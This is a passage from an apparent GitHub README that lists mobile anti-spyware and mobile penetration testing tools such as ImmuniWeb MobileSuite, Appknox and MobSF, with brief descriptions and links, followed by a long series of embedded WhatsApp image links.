   - Alerts users to unauthorized access attempts.

4. **Anti Spy**  
   - **Source:** [ProtectStar](https://www.protectstar.com)  
   - Comprehensive anti-spyware solution for mobile devices.

---

### **Mobile Pen Testing Toolkits**

Mobile penetration testing tools assist security professionals in identifying vulnerabilities in mobile applications and backend systems. These toolkits are essential for static, dynamic, and interactive security assessments.

#### **Top Pen Testing Tools**
1. **ImmuniWeb® MobileSuite**  
   - **Source:** [immuniweb.com](https://www.immuniweb.com)  
   - Combines manual penetration testing with machine learning for thorough app and backend assessments.

2. **Codified Security**  
   - **Source:** [codifiedsecurity.com](https://codifiedsecurity.com)  
   - Automated mobile app security testing solution.

3. **Appknox**  
   - **Source:** [appknox.com](https://www.appknox.com)  
   - Provides detailed security assessments for mobile apps and APIs.

4. **MobSF (Mobile Security Framework)**  
   - **Source:** [MobSF](https://mobsf.live)  
   - A versatile tool for static and dynamic analysis of Android and iOS apps.

5. **Data Theorem’s Mobile Secure**  
   - **Source:** [datatheorem.com](https://www.datatheorem.com)  
   - Specializes in securing mobile apps, APIs, and backend systems.






![WhatsApp Image 2024-12-21 at 11 29 18_055dfbcb](https://github.com/user-attachments/assets/b5c55973-30bf-450a-9032-84e45d75f71a)
![WhatsApp Image 2024-12-21 at 11 29 17_9f9403c9](https://github.com/user-attachments/assets/ddf757d8-6bdf-44ec-a02f-63cc02a955aa)
![WhatsApp Image 2024-12-21 at 11 29 18_6abf521e](https://github.com/user-attachments/assets/6d1f4ceb-493c-451d-9686-d28762401af6)
![WhatsApp Image 2024-12-21 at 11 29 18_90bcd79c](https://github.com/user-attachments/assets/02d8fb1b-673d-404e-8fba-c558fdf0542e)
![WhatsApp Image 2024-12-21 at 11 29 19_4f44ac56](https://github.com/user-attachments/assets/595c2dc4-75ac-4ef4-9246-37a8a837272c)
![WhatsApp Image 2024-12-21 at 11 29 19_13a32211](https://github.com/user-attachments/assets/08a82c07-3f8a-4d8e-b028-20c8fbb612f1)
![WhatsApp Image 2024-12-21 at 11 29 19_451ef75c](https://github.com/user-attachments/assets/c395f351-5a05-4cb5-9cd2-f84612c8449f)
![WhatsApp Image 2024-12-21 at 11 29 20_534d23a4](https://github.com/user-attachments/assets/c5dbf480-a58f-42d6-a5fd-a27b413546db)
![WhatsApp Image 2024-12-21 at 11 29 20_3224ff09](https://github.com/user-attachments/assets/1453aca6-e7b0-4146-a71b-29e3847f00a5)
![WhatsApp Image 2024-12-21 at 11 29 20_25251ca5](https://github.com/user-attachments/assets/c807ca35-6de1-4652-884c-f3dcb8b7c0d6)
![WhatsApp Image 2024-12-21 at 11 29 21_104408b7](https://github.com/user-attachments/assets/46229562-3cab-48a0-b2af-ad3c8628711c)
![WhatsApp Image 2024-12-21 at 11 29 21_cba3a805](https://github.com/user-attachments/assets/2fd81060-e4fd-451c-9d5f-d8fcb620e43b)
![WhatsApp Image 2024-12-21 at 11 29 21_d0154634](https://github.com/user-attachments/assets/ab6cc644-8f0f-46d9-a825-30fe2c6a8c38)
![WhatsApp Image 2024-12-21 at 11 29 22_76c61560](https://github.com/user-attachments/assets/e0c35541-9d82-4819-8c3b-d2f48e6a7748)
![WhatsApp Image 2024-12-21 at 11 29 22_087da969](https://github.com/user-attachments/assets/8a5c25a7-fd9c-4324-bb40-53acd8e3991d)
![WhatsApp Image 2024-12-21 at 11 29 22_ba46362f](https://github.com/user-attachments/assets/9ffb59a6-1413-4ef3-87f3-710363320c7c)
![WhatsApp Image 2024-12-21 at 11 29 23_1530f917](https://github.com/user-attachments/assets/da5df044-8f26-4206-b482-d482fc2459eb)
![WhatsApp Image 2024-12-21 at 11 29 23_6982cd4c](https://github.com/user-attachments/assets/d9c8088f-1165-4609-94c2-c37dceb6b64d)
![WhatsApp Image 2024-12-21 at 11 29 23_70819f2e](https://github.com/user-attachments/assets/5eb63728-2e36-494a-ae86-1c406cfd3da0)
![WhatsApp Image 2024-12-21 at 11 29 24_54f9fda6](https://github.com/user-attachments/assets/a57bf8f6-a723-45ef-85a8-ce69b1e08201)
![WhatsApp Image 2024-12-21 at 11 29 24_c6287b45](https://github.com/user-attachments/assets/033dcda2-dea6-41d1-a33a-75a9ab32b58f)

![WhatsApp Image 2024-12-21 at 11 29 24_dd1d2446](https://github.com/user-attachments/assets/5aaed216-ec5c-4b80-b3e5-9583e40556a4)
![WhatsApp Image 2024-12-21 at 11 29 25_3e8de8a2](https://github.com/user-attachments/assets/424d03cc-6d43-4181-83ab-0c5d3da7f4ff)
![WhatsApp Image 2024-12-21 at 11 29 25_6d070f52](https://github.com/user-attachments/assets/c25aa950-59c2-4704-8ab0-49e1d972abe9)
![WhatsApp Image 2024-12-21 at 11 29 25_6634aae6](https://github.com/user-attachments/assets/a8040215-6ff3-42ed-ad3b-706542528be9)
![WhatsApp Image 2024-12-21 at 11 29 26_80fcd1fb](https://github.com/user-attachments/assets/3f32fead-0d0f-47f4-9670-bbee38d1eb4f)
![WhatsApp Image 2024-12-21 at 11 29 26_7290da1c](https://github.com/user-attachments/assets/32c4a6e3-d07f-46b4-b4e7-da7b207ea1b4)
![WhatsApp Image 2024-12-21 at 11 29 26_ce5b3886](https://github.com/user-attachments/assets/07706138-4d46-4443-a47d-8037b6a13c5d)
![WhatsApp Image 2024-12-21 at 11 29 26_d1bdefb1](https://github.com/user-attachments/assets/d654a261-f2b3-47f2-ba2f-527382cc4326)
![WhatsApp Image 2024-12-21 at 11 29 27_304c276b](https://github.com/user-attachments/assets/de556233-b9ab-439d-b95a-67c70b99369a)
![WhatsApp Image 2024-12-21 at 11 29 27_d00e10cd](https://github.com/user-attachments/assets/5c59d219-e770-4947-a2c2-77bdb0ac4335)
![WhatsApp Image 2024-12-21 at 11 29 27_f12c1ae0](https://github.com/user-attachments/assets/3624289f-9e66-4425-876e-4d86d7af5a14)
![WhatsApp Image 2024-12-21 at 11 29 28_3e280dae](https://github.com/user-attachments/assets/62ac2baf-4dc6-4bde-be4d-f4d10047724a)
![WhatsApp Image 2024-12-21 at 11 29 28_55764bc7](https://github.com/user-attachments/assets/a8a11588-cc0c-46c8-bca9-c4f9c866c9a4)
![WhatsApp Image 2024-12-21 at 11 29 28_fd940576](https://github.com/user-attachments/assets/914c96f5-5d44-46ae-8dd1-34e32338012a)
![WhatsApp Image 2024-12-21 at 11 29 29_18b0f805](https://github.com/user-attachments/assets/bb6de3b4-9817-4d48-8b00-55a2b7f89089)
![WhatsApp Image 2024-12-21 at 11 29 29_b8950eeb](https://github.com/user-attachments/assets/7379c67f-eec3-40df-bea4-882fe845d595)
![WhatsApp Image 2024-12-21 at 11 29 29_e68cf3f8](https://github.com/user-attachments/assets/3902a663-40e1-4369-96e6-448e35e06caf)
![WhatsApp Image 2024-12-21 at 11 29 30_4746e1bf](https://github.com/user-attachments/assets/ac07bcdb-b307-4a7e-a47c-c5642b002b49)
![WhatsApp Image 2024-12-21 at 11 29 30_65309a0c](https://github.com/user-attachments/assets/f2d4f1e8-0142-4e8c-8a48-a5b8e626d499)
![WhatsApp Image 2024-12-21 at 11 29 30_cd83166a](https://github.com/user-attachments/assets/80b21d12-4874-45cb-b158-50b0a8b5a1ea)


![WhatsApp Image 2024-12-21 at 11 29 31_2b582494](https://github.com/user-attachments/assets/291c0d2c-d8b7-4130-a4c4-92e1337973be)


![WhatsApp Image 2024-12-21 at 11 29 31_7d1d4ef7](https://github.com/user-attachments/assets/510998ca-c775-4667-9421-fcdd6d8239db)

![WhatsApp Image 2024-12-21 at 11 29 31_9004bd04](https://github.com/user-attachments/assets/e9fc825c-663c-4ab8-88fa-4cd2a602aa72)
![WhatsApp Image 2024-12-21 at 11 29 32_64b9ed70](https://github.com/user-attachments/assets/17113263-2805-4ceb-8250-f07fbb0c04dc)
![WhatsApp Image 2024-12-21 at 11 29 32_19517a40](https://github.com/user-attachments/assets/c7f9d494-07b5-421d-923e-081bb9d4dffe)


![WhatsApp Image 2024-12-21 at 11 29 32_ead13c14](https://github.com/user-attachments/assets/b19621bb-01d8-4e85-a117-0a04f4f22659)
![WhatsApp Image 2024-12-21 at 11 29 33_47b72fb4](https://github.com/user-attachments/assets/0f544149-f3b4-49f5-a361-4786b9f4410f)
![WhatsApp Image 2024-12-21 at 11 29 33_65793aed](https://github.com/user-attachments/assets/f03250d2-aa37-4940-b7fb-dbbf0685b827)
![WhatsApp Image 2024-12-21 at 11 29 33_bc33d4ab](https://github.com/user-attachments/assets/df011e06-2668-4dbc-a704-1dd88ada7f47)
![WhatsApp Image 2024-12-21 at 11 29 34_3b3503e1](https://github.com/user-attachments/assets/427ef039-e4dd-45c4-8efe-33c83025b67d)


![WhatsApp Image 2024-12-21 at 11 29 34_acf64aa8](https://github.com/user-attachments/assets/879ebf83-b7fd-4538-9b42-b657b97c07de)
![WhatsApp Image 2024-12-21 at 11 29 34_cc6a63be](https://github.com/user-attachments/assets/8d7b31e1-ac54-49f4-a3ef-b7abbd7be2bb)

![WhatsApp Image 2024-12-21 at 11 29 35_3ce40385](https://github.com/user-attachments/assets/36a4e9d0-fe6d-483c-bb19-2b02cf6ef7f8)
![WhatsApp Image 2024-12-21 at 11 29 18_1548b179](https://github.com/user-attachments/assets/70aad19b-a6c6-4534-977e-c593b39a6751)
